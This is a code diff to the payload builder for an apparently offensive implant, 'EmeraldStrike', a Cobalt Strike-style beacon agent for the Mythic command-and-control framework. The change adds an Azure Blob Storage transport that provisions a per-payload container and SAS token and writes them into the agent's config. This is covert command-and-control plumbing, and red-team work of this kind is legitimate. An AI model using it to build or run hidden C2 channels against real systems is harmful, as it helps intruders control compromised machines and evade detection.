@@ -10,6 +10,7 @@ import logging
 import json
 import io
 import base64 as b64mod
+from datetime import datetime, timedelta
 
 from mythic_container.PayloadBuilder import *
 from mythic_container.MythicCommandBase import *
@@ -43,7 +44,7 @@ class EmeraldStrike(PayloadType):
     wrapped_payloads = []
     note = "CS 4.13-compatible PIC beacon agent with UDRL, sleepmask, and BOF support."
     supports_dynamic_loading = True
-    c2_profiles = ["http", "smb"]
+    c2_profiles = ["http", "smb", "azure_blob"]
     mythic_encrypts = True
     translation_container = "EmeraldStrikeTranslator"
 
@@ -267,12 +268,30 @@ class EmeraldStrike(PayloadType):
                 break
 
             transport_define = ""
+            blob_provision = None
             if c2_profile_name == "http":
                 transport_define = "#define HTTP_TRANSPORT"
             elif c2_profile_name == "smb":
                 transport_define = "#define SMB_TRANSPORT"
+            elif c2_profile_name == "azure_blob":
+                transport_define = "#define AZURE_BLOB_TRANSPORT"
+                # Provision the per-payload container + SAS via the C2 profile's
+                # generate_config RPC. The account key never leaves the server;
+                # only the endpoint/container/SAS are stamped into the agent.
+                blob_provision = await self._provision_azure_blob(c2_params)
+                await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
+                    PayloadUUID=self.uuid,
+                    StepName="Gathering",
+                    StepStdout=(
+                        f"Provisioned Azure container: {blob_provision['container_name']}\n"
+                        f"Endpoint: {blob_provision['host']}\n"
+                        f"SAS expiry: {c2_params.get('killdate') or 'build+28d (default)'}\n"
+                        f"SAS permissions: read, write, list, add, create, delete"
+                    ),
+                    StepSuccess=True,
+                ))
 
-            config_bytes = self._serialize_config(c2_profile_name, c2_params)
+            config_bytes = self._serialize_config(c2_profile_name, c2_params, blob_provision)
             config_hex = ", ".join(f"0x{b:02x}" for b in config_bytes)
 
             # Stamp config.h
@@ -495,7 +514,7 @@ class EmeraldStrike(PayloadType):
 
         return resp
 
-    def _serialize_config(self, c2_profile, c2_params):
+    def _serialize_config(self, c2_profile, c2_params, blob_provision=None):
         buf = b""
 
         uuid_bytes = self.uuid.encode("utf-8")[:36].ljust(36, b"\x00")
@@ -566,7 +585,53 @@ class EmeraldStrike(PayloadType):
             pipename = c2_params.get("pipename", "")
             buf += self._pack_string(pipename)
 
+        elif c2_profile == "azure_blob":
+            if not blob_provision:
+                raise Exception("azure_blob profile selected but container provisioning did not run")
+            # Mirrors the AZURE_BLOB_TRANSPORT branch of parse_config exactly:
+            # host, container, sas - all length-prefixed strings.
+            buf += self._pack_string(blob_provision["host"])
+            buf += self._pack_string(blob_provision["container_name"])
+            buf += self._pack_string(blob_provision["sas_token"])
+
         return buf
+
+    async def _provision_azure_blob(self, c2_params: dict) -> dict:
+        """Ask the azure_blob C2 profile to create this payload's container and
+        mint a container-scoped SAS. Raises on failure so the build errors out
+        instead of shipping an agent that can never reach its container."""
+        killdate = c2_params.get("killdate") or None
+        if killdate:
+            killdate = str(killdate).split(" ")[0]
+            try:
+                datetime.strptime(killdate, "%Y-%m-%d")
+            except ValueError:
+                killdate = None
+        if not killdate:
+            # The SAS must outlive the payload; default 28 days like the C2
+            # profile's own killdate parameter default.
+            killdate = (datetime.utcnow() + timedelta(days=28)).strftime("%Y-%m-%d")
+
+        cfg = await SendMythicRPCOtherServiceRPC(MythicRPCOtherServiceRPCMessage(
+            ServiceName="azure_blob",
+            ServiceRPCFunction="generate_config",
+            ServiceRPCFunctionArguments={
+                "killdate": killdate,
+                "payload_uuid": self.uuid,
+            },
+        ))
+        if not cfg.Success:
+            raise Exception(f"Azure container provisioning failed: {cfg.Error}")
+
+        res = cfg.Result
+        endpoint = res.get("blob_endpoint", "")
+        # The agent wants a bare hostname for InternetConnectA/WinHttpConnect.
+        host = endpoint.split("://", 1)[1] if "://" in endpoint else endpoint
+        return {
+            "host": host,
+            "container_name": res["container_name"],
+            "sas_token": res["sas_token"].lstrip("?"),
+        }
 
     def _pack_string(self, s):
         if isinstance(s, str):
